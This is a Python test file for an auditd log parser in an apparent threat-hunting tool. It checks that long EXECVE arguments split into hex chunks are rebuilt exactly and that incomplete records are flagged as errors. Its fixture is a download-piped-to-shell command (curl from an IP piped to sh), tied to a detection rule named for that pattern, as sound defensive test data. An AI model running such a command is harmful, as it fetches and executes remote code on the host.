"""Long EXECVE arguments: auditd splits an argument longer than one record allows into `aN_len=` plus
`aN[0]=`, `aN[1]=` chunks, possibly across several EXECVE records of one event. The parser must rebuild every
argument exactly; a missing chunk, a length mismatch or an argc mismatch must make the record an error (the
sweep then marks process rules partial), never a silently shortened argv."""
from datetime import UTC, datetime, timedelta

import pytest

from romulus.evidence.auditd import AuditParseError, execve_argv, parse_record
from romulus.evidence.normalize import normalize_hits
from romulus.hunt import sweep as sw
from romulus.sources.models import Completeness, SearchOutcome, Window
from romulus.store.db import make_engine, migrate
from romulus.store.repo import Repo

HEAD = "type=EXECVE msg=audit(1731940424.829:9001): "
SYSCALL = ('type=SYSCALL msg=audit(1731940424.829:9001): arch=c000003e syscall=59 success=yes exit=0 ppid=10 '
           'pid=11 auid=1000 uid=1000 euid=1000 comm="bash" exe="/usr/bin/bash" key=(null)')
LONG = "curl -s http://203.0.113.9/x | sh; " * 300                   # longer than one audit record holds


def _hex(text: str) -> str:
    return text.encode().hex().upper()


def _chunks(index: int, text: str, size: int) -> list[str]:
    parts = [text[i:i + size] for i in range(0, len(text), size)]
    return [f"a{index}_len={len(text.encode())}"] + [f"a{index}[{n}]={_hex(p)}" for n, p in enumerate(parts)]


def _argv(body: str) -> list[str]:
    return execve_argv(parse_record(HEAD + body))


def test_a_long_argument_is_rebuilt_from_its_chunks():
    body = " ".join(["argc=3", 'a0="bash"', 'a1="-c"', *_chunks(2, LONG, 7000)])
    assert _argv(body) == ["bash", "-c", LONG]


def test_quoted_and_hex_chunks_of_one_argument_are_joined_in_order():
    body = 'argc=2 a0="echo" a1_len=11 a1[0]="hello" a1[1]=' + _hex(" world")
    assert _argv(body) == ["echo", "hello world"]


def test_chunk_order_follows_the_index_not_the_record_order():
    body = "argc=2 a0=\"echo\" a1_len=6 a1[1]=" + _hex("def") + " a1[0]=" + _hex("abc")
    assert _argv(body) == ["echo", "abcdef"]


@pytest.mark.parametrize("body,why", [
    ("argc=2 a0=\"echo\" a1_len=9 a1[0]=" + _hex("abc") + " a1[2]=" + _hex("ghi"), "a middle chunk is missing"),
    ("argc=2 a0=\"echo\" a1_len=9 a1[0]=" + _hex("abc") + " a1[1]=" + _hex("def"), "the last chunk is missing"),
    ("argc=2 a0=\"echo\" a1_len=3 a1[1]=" + _hex("def"), "the first chunk is missing"),
    ("argc=2 a0=\"echo\" a1_len=9", "every chunk is missing"),
    ("argc=2 a0=\"echo\" a1_len=x a1[0]=" + _hex("abc"), "the length is not a number"),
    ("argc=2 a0=\"echo\" a1[0]=" + _hex("abc"), "the length is missing"),
    ("argc=2 a0=\"echo\" a1=\"x\" a1_len=3 a1[0]=" + _hex("abc"), "an argument is both whole and chunked"),
    ("argc=2 a0=\"echo\" a1_len=3 a1[0]=ZZZ", "a chunk is not hex"),
    ("argc=3 a0=\"echo\" a1=\"x\"", "argc counts an argument that is absent"),
    ("argc=2 a0=\"echo\" a1=\"x\" a2=\"y\"", "an argument beyond argc is present"),
])
def test_an_incomplete_or_inconsistent_argv_is_an_error_not_a_shorter_argv(body, why):
    with pytest.raises(AuditParseError):
        _argv(body)


def _hit(n: int, raw: str) -> dict:
    return {"_id": f"r{n}", "_index": "romulus-host-x", "_source": {
        "@timestamp": "2024-11-18T14:33:44.829Z", "message": raw, "host": {"name": "video"},
        "event": {"dataset": "linux.audit", "original": raw}}}


def _split_event(*, drop_continuation: bool) -> list[dict]:
    first = HEAD + " ".join(["argc=3", 'a0="bash"', 'a1="-c"', *_chunks(2, LONG, 7000)[:2]])
    rest = HEAD + " ".join(_chunks(2, LONG, 7000)[2:])
    raws = [first, SYSCALL] if drop_continuation else [first, rest, SYSCALL]
    return [_hit(n, raw) for n, raw in enumerate(raws)]


def test_an_argument_split_across_two_execve_records_is_merged():
    events, _skips, errors = normalize_hits(_split_event(drop_continuation=False))
    assert errors == [] and [e.get("process.argv") for e in events] == [["bash", "-c", LONG]]


def test_a_missing_continuation_record_is_a_normalization_error_and_process_rules_are_partial(monkeypatch):
    hits = _split_event(drop_continuation=True)
    events, _skips, errors = normalize_hits(hits)
    assert events == [] and len(errors) == 1 and errors[0][1].startswith("linux.audit:")

    start = datetime(2024, 11, 18, 14, 30, tzinfo=UTC)
    window = Window(start=start, end=start + timedelta(minutes=5))
    now = datetime.now(UTC)
    monkeypatch.setattr(sw, "execute", lambda client, intent, contract: SearchOutcome(
        target=intent.target, fingerprint="f", started_at=now, ended_at=now, completeness=Completeness.complete,
        total=len(hits), total_relation="eq", returned=len(hits), records=hits))
    engine = make_engine(":memory:")
    migrate(engine)
    repo = Repo(engine)
    repo.create_hunt("h1", {"targets": ["romulus-host-x"]}, "d", "t")
    sweep = sw.Sweep(repo, None, "h1", window, {"romulus-host-x": None})
    sweep.run_partition("romulus-host-x", None, [], window, est=len(hits))
    cells = {c["rule_id"]: c for c in repo.rule_cells("h1")}
    assert cells["host.download_piped_to_shell"]["state"] == "evaluated_partial"      # no exec event survived
    assert any(r.startswith("normalization_errors=1 in linux.audit")
               for r in cells["host.download_piped_to_shell"]["detail"]["reasons"])
    assert sweep.partial_reasons
